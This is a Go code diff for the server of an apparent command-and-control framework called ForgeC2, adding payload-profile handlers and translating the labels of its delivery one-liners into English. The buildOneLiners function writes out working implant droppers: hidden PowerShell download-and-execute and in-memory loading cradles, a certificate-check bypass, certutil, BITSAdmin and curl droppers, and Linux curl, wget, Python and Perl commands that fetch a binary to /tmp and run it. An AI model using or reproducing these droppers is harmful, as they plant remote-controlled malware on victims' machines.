@@ -1,7 +1,9 @@
 package server
 
 import (
+	"encoding/json"
 	"fmt"
+	"html/template"
 	"io"
 	"log/slog"
 	"net/http"
@@ -49,18 +51,56 @@ func (s *Server) getListeners() []db.Listener {
 	return listenerCache
 }
 
+func (s *Server) implantDataDir() string {
+	if s.cfg.Server.DataDir != "" {
+		return s.cfg.Server.DataDir
+	}
+	return "data"
+}
+
+func (s *Server) handleImportProfile(c *gin.Context) {
+	file, err := c.FormFile("profile")
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "profile file required"})
+		return
+	}
+	f, err := file.Open()
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "failed to open profile file"})
+		return
+	}
+	defer f.Close()
+	raw, err := io.ReadAll(f)
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "failed to read profile file"})
+		return
+	}
+	profile, err := payload.SaveImportedProfile(s.implantDataDir(), raw)
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": err.Error()})
+		return
+	}
+	c.JSON(http.StatusOK, gin.H{"success": true, "profile": profile})
+}
+
+func (s *Server) handleListProfiles(c *gin.Context) {
+	c.JSON(http.StatusOK, gin.H{"success": true, "profiles": payload.ListProfilePresets(s.implantDataDir())})
+}
+
 func (s *Server) handleGeneratePage(c *gin.Context) {
 	listeners := s.getListeners()
+	presetsJSON, _ := json.Marshal(payload.ListProfilePresets(s.implantDataDir()))
 
 	stats := s.getNavStats()
 	data := gin.H{
-		"Title":          "ForgeC2 - Generate Agent",
-		"ActiveNav":      "generate",
-		"DefaultInt":     s.cfg.Implant.DefaultInterval,
-		"DefaultJitter":  s.cfg.Implant.DefaultJitter,
-		"DefaultUA":      s.cfg.Implant.DefaultUA,
-		"DefaultSkipTLS": s.cfg.Implant.DefaultSkipTLS,
-		"Listeners":      listeners,
+		"Title":               "ForgeC2 - Generate Agent",
+		"ActiveNav":           "generate",
+		"DefaultInt":          s.cfg.Implant.DefaultInterval,
+		"DefaultJitter":       s.cfg.Implant.DefaultJitter,
+		"DefaultUA":           s.cfg.Implant.DefaultUA,
+		"DefaultSkipTLS":      s.cfg.Implant.DefaultSkipTLS,
+		"Listeners":           listeners,
+		"ProfilePresetsJSON":  template.JS(presetsJSON),
 	}
 	for k, v := range stats {
 		data[k] = v
@@ -526,7 +566,7 @@ func (s *Server) handleGeneratePS1(c *gin.Context) {
 		Proxy:         form.Proxy,
 	}
 
-	ps1Code, err := payload.GeneratePowerShellSource(cfg)
+	ps1Code, err := payload.GeneratePowerShellSource(cfg, s.implantDataDir())
 	if err != nil {
 		s.logBuild("windows", "ps1", form.C2URL, form.ListenerID, form.Filename, "failed", err.Error(), "")
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
@@ -686,7 +726,7 @@ func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 		filename = "beacon.exe"
 		format = "exe"
 	case "ps1":
-		ps1Code, genErr = payload.GeneratePowerShellSource(cfg)
+		ps1Code, genErr = payload.GeneratePowerShellSource(cfg, s.implantDataDir())
 		filename = "beacon.ps1"
 		format = "ps1"
 	case "linux":
@@ -755,42 +795,42 @@ func buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, proxy string) []
 	case "exe":
 		items = append(items, oneLinerItem{
 			Name: "PowerShell Download + Exec",
-			Desc: "下载 EXE 到临时目录并执行",
+			Desc: "Download EXE to temp dir and execute",
 			Command: fmt.Sprintf(
 				`powershell -nop -w hidden -c "$p='$env:TEMP\\svc.exe';[Net.WebClient]::new().DownloadFile('%s',$p);Start-Process $p"`,
 				payloadURL),
 		})
 		items = append(items, oneLinerItem{
 			Name: "PowerShell Memory Load (.NET)",
-			Desc: "直接从内存加载 .NET EXE（不写磁盘）",
+			Desc: "Load .NET EXE directly from memory (no disk write)",
 			Command: fmt.Sprintf(
 				`powershell -nop -w hidden -c "[Reflection.Assembly]::Load([Net.WebClient]::new().DownloadData('%s')).EntryPoint.Invoke($null,$null)"`,
 				payloadURL),
 		})
 		items = append(items, oneLinerItem{
 			Name: "certutil",
-			Desc: "使用 certutil 下载后执行",
+			Desc: "Download via certutil and execute",
 			Command: fmt.Sprintf(
 				`certutil -urlcache -split -f %s %%TEMP%%\\svc.exe & start /b %%TEMP%%\\svc.exe`,
 				payloadURL),
 		})
 		items = append(items, oneLinerItem{
 			Name: "BITSAdmin",
-			Desc: "使用 BITSAdmin 后台下载后执行",
+			Desc: "Background download via BITSAdmin and execute",
 			Command: fmt.Sprintf(
 				`bitsadmin /transfer forgec2 /download /priority high %s %%TEMP%%\\svc.exe & start /b %%TEMP%%\\svc.exe`,
 				payloadURL),
 		})
 		items = append(items, oneLinerItem{
 			Name: "curl.exe + start",
-			Desc: "使用 curl 下载后执行（Win10+ 自带）",
+			Desc: "Download via curl and execute (Win10+ built-in)",
 			Command: fmt.Sprintf(
 				`curl -sL %s -o %%TEMP%%\\svc.exe & start /b %%TEMP%%\\svc.exe`,
 				payloadURL),
 		})
 		items = append(items, oneLinerItem{
 			Name: "PowerShell WebClient + IEX (Obfuscated)",
-			Desc: "混淆后的 PowerShell 远程下载执行",
+			Desc: "Obfuscated PowerShell remote download and execute",
 			Command: fmt.Sprintf(
 				`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('%s')"`,
 				payloadURL),
@@ -800,26 +840,26 @@ func buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, proxy string) []
 		// URL-based download cradle
 		items = append(items, oneLinerItem{
 			Name: "IEX DownloadString",
-			Desc: "远程下载 PS1 脚本并通过 IEX 执行",
+			Desc: "Remote download PS1 script and execute via IEX",
 			Command: fmt.Sprintf(
 				`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('%s')"`,
 				payloadURL),
 		})
 		items = append(items, oneLinerItem{
 			Name: "IEX DownloadString + SSL",
-			Desc: "忽略证书错误的远程下载执行",
+			Desc: "Remote download and execute ignoring cert errors",
 			Command: fmt.Sprintf(
 				`powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(New-Object Net.WebClient).DownloadString('%s')"`,
 				payloadURL),
 		})
 		items = append(items, oneLinerItem{
 			Name:    "PowerShell Base64 (Self-Contained)",
-			Desc:    "内置 Base64 编码的 PS1 脚本，无需远程下载",
+			Desc:    "Built-in Base64 encoded PS1 script, no download needed",
 			Command: obfuscation.GenerateCommandLineOneLiner(ps1Code),
 		})
 		items = append(items, oneLinerItem{
 			Name: "IEX DownloadString + Proxy",
-			Desc: "通过 HTTP 代理下载并执行",
+			Desc: "Download and execute via HTTP proxy",
 			Command: fmt.Sprintf(
 				`powershell -nop -w hidden -c "$wc=New-Object Net.WebClient;$wc.Proxy=New-Object Net.WebProxy('%s');IEX($wc.DownloadString('%s'))"`,
 				proxy, payloadURL),
@@ -828,35 +868,35 @@ func buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, proxy string) []
 	case "linux":
 		items = append(items, oneLinerItem{
 			Name: "curl download + exec",
-			Desc: "下载 ELF 到 /tmp 并执行（后台）",
+			Desc: "Download ELF to /tmp and execute (background)",
 			Command: fmt.Sprintf(
 				`curl -sL %s -o /tmp/.u && chmod +x /tmp/.u && nohup /tmp/.u &`,
 				payloadURL),
 		})
 		items = append(items, oneLinerItem{
 			Name: "wget download + exec",
-			Desc: "使用 wget 下载 ELF 并执行",
+			Desc: "Download ELF via wget and execute",
 			Command: fmt.Sprintf(
 				`wget -q %s -O /tmp/.u && chmod +x /tmp/.u && nohup /tmp/.u &`,
 				payloadURL),
 		})
 		items = append(items, oneLinerItem{
 			Name: "python3 download + exec",
-			Desc: "使用 Python3 urllib 下载并执行",
+			Desc: "Download via Python3 urllib and execute",
 			Command: fmt.Sprintf(
 				`python3 -c "import urllib.request,os;f='/tmp/.u';urllib.request.urlretrieve('%s',f);os.chmod(f,0o755);os.system(f+' &')"`,
 				payloadURL),
 		})
 		items = append(items, oneLinerItem{
 			Name: "python2 download + exec",
-			Desc: "使用 Python2 urllib 下载并执行",
+			Desc: "Download via Python2 urllib and execute",
 			Command: fmt.Sprintf(
 				`python -c "import urllib,os;f='/tmp/.u';urllib.urlretrieve('%s',f);os.chmod(f,0o755);os.system(f+' &')"`,
 				payloadURL),
 		})
 		items = append(items, oneLinerItem{
 			Name: "perl download + exec",
-			Desc: "使用 Perl 下载并执行",
+			Desc: "Download via Perl and execute",
 			Command: fmt.Sprintf(
 				`perl -e "use LWP::Simple;getstore('%s','/tmp/.u');chmod 0755,'/tmp/.u';system('/tmp/.u &')"`,
 				payloadURL),
